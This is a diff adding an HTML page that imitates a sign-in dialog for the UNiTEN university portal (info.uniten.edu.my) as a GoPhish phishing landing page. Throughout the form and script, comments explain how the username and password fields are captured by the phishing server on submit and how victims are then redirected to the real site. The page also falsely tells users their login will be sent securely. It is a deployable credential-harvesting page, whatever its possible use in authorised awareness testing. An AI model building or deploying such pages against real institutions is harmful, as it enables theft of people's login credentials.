@@ -1,0 +1,167 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>UNiTEN Login Mockup</title>
+    <style>
+        /* CSS Variables for Dark Mode Look */
+        :root {
+            --background-color: #1c1c1e; /* Darker background like the modal */
+            --text-color: #ffffff; /* White text */
+            --secondary-text-color: #b0b0b0; /* Lighter grey for description/placeholders */
+            --input-background: #3a3a3c; /* Dark grey for input fields */
+            --link-color-blue: #0a84ff; /* iOS-style blue button */
+            --border-radius: 12px;
+            /* Using a common font stack for an iOS-like appearance */
+            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
+        }
+
+        body {
+            /* Pure black background like the image */
+            background-color: #000000;
+            display: flex;
+            /* Position the dialog slightly above center to match the screenshot */
+            justify-content: center;
+            align-items: flex-start;
+            padding-top: 15vh; /* Adjust as needed */
+            height: 100vh;
+            margin: 0;
+            font-family: var(--font-family);
+            color: var(--text-color);
+            box-sizing: border-box;
+        }
+
+        /* The Modal / Alert Box */
+        .login-dialog {
+            width: 300px; /* Standard alert box width */
+            background-color: var(--background-color);
+            border-radius: var(--border-radius);
+            padding: 16px;
+            /* Mimics the depth/shadow of an overlaid system dialog */
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.05);
+            z-index: 20; /* Ensure dialog is above mock browser UI */
+        }
+
+        /* Header Text */
+        .header-text {
+            font-size: 17px;
+            font-weight: 600; /* Semi-bold */
+            text-align: left;
+            margin-bottom: 4px;
+        }
+
+        /* Description Text */
+        .description-text {
+            font-size: 13px;
+            color: var(--secondary-text-color);
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        /* Form Group for Inputs */
+        .input-group {
+            background-color: var(--input-background);
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 16px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: none;
+            outline: none;
+            background: none;
+            color: var(--text-color);
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        /* Separator line between Username and Password */
+        .input-group input[placeholder="Username"] {
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .input-group input::placeholder {
+            color: var(--secondary-text-color);
+        }
+
+        /* Button Area */
+        .button-group {
+            display: flex;
+            justify-content: flex-end;
+            gap: 16px;
+            padding-top: 8px;
+        }
+
+        .dialog-button {
+            background: none;
+            border: none;
+            font-size: 17px;
+            cursor: pointer;
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-weight: 400; /* Regular */
+            -webkit-appearance: none; /* Remove default button styles */
+            appearance: none;
+        }
+
+        .cancel-button {
+            color: var(--secondary-text-color);
+        }
+
+        .signin-button {
+            color: var(--link-color-blue);
+            font-weight: 600; /* Semi-bold for the primary action */
+        }
+    </style>
+</head>
+<body>
+
+    <!-- CRITICAL FOR GOPHISH: Form must use method="POST" and action="/" (default behavior) -->
+    <form method="POST" id="login_form" class="login-dialog" action="">
+        <div class="header-text">Sign in to info.uniten.edu.my</div>
+        <div class="description-text">Your login information will be sent securely.</div>
+
+        <div class="input-group">
+            <!-- CRITICAL FOR GOPHISH: Input field must be named 'username' -->
+            <input type="text" placeholder="Username" aria-label="Username" name="username" required=""/>
+            <!-- CRITICAL FOR GOPHISH: Input field must be named 'password' -->
+            <input type="password" placeholder="Password" aria-label="Password" required=""/>
+        </div>
+
+        <div class="button-group">
+            <!-- Prevent Cancel button from submitting the form -->
+            <button type="button" class="dialog-button cancel-button" onclick="window.history.back(); return false;">Cancel</button>
+            <!-- CRITICAL FOR GOPHISH: type="submit" triggers the GoPhish data capture -->
+            <button type="submit" class="dialog-button signin-button">Sign In</button>
+        </div>
+    </form>
+
+    <script>
+        // CRITICAL FOR GOPHISH: The script ensures redirection occurs AFTER the POST request captures credentials.
+        document.getElementById('login_form').addEventListener('submit', function(event) {
+            // GoPhish captures the credentials upon form submission via POST.
+            // After capture, we need to redirect the user to a legitimate page
+            // to make the experience seamless.
+            // GoPhish will handle the actual data POSTing before this script runs.
+
+            // To configure the redirection URL, use the "Redirect URL" setting
+            // in your GoPhish Campaign configuration.
+            // The phishing server handles the actual HTTP redirect after processing
+            // the credentials, making this client-side JS optional but a good fallback.
+
+            // If you need an immediate client-side redirect fallback (optional, as GoPhish typically handles the final redirect):
+            // event.preventDefault(); // Keep this commented out so GoPhish POST works.
+            // window.location.href = 'https://info.uniten.edu.my/';
+        });
+
+        // Basic functionality for Cancel button, which was already present
+        document.querySelector('.cancel-button').addEventListener('click', function(event) {
+            // Optionally, redirect to the real UNiTEN site on cancel.
+            // window.location.href = 'https://info.uniten.edu.my/';
+        });
+    </script>
+
+
+
+</body></html>
